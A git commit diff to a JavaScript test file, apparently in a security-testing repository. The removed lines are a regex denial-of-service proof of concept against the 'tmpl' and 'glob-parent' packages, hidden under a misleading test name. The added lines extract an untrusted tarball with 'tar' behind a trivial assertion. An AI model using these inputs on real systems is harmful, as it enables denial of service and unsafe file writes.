79016791d47f1f38dee57bdd36509143824ed9be
torbeerandom <tor@legitsecurity.com>
2022-02-07 13:59:22 +0200

    Revert "Revert "tarball and tar require extract""
    This reverts commit 4b0e99502eac0eb3c12a0cf5c915aa088898c61e.

--- __test__/game.test.js
+++ __test__/game.test.js
@@ -1,23 +1,10 @@
-function buildAttack (n) {
-  let ret = '{'
-  for (let i = 0; i < n; i++) {
-    ret += '/'
-  }
-  return ret
-}
-const tmpl = require('tmpl')
-const globParent = require('glob-parent')
+const tar = require('tar')
 describe('App', () => {
-  it('Contains the compiled JavaScript', async () => {
-    for (let i = 1; i <= 50000; i++) {
-      const time = Date.now()
-      const attackStr = '' + '{'.repeat(i * 10000) + 'answer'
-      tmpl(attackStr, { answer: 42 })
-      const timeCost = Date.now() - time
-      console.log('attackStr.length: ' + attackStr.length + ': ' + timeCost + ' ms')
+  tar.x(
+    {
+      file: 'my-tarball.tar.gz'
     }
-    globParent(buildAttack(5000))
-    const data = 'data'
-    expect(data).toBe('data')
-  })
+  ).then(_ => {})
+  const data = 'data'
+  expect(data).toBe('data')
 })
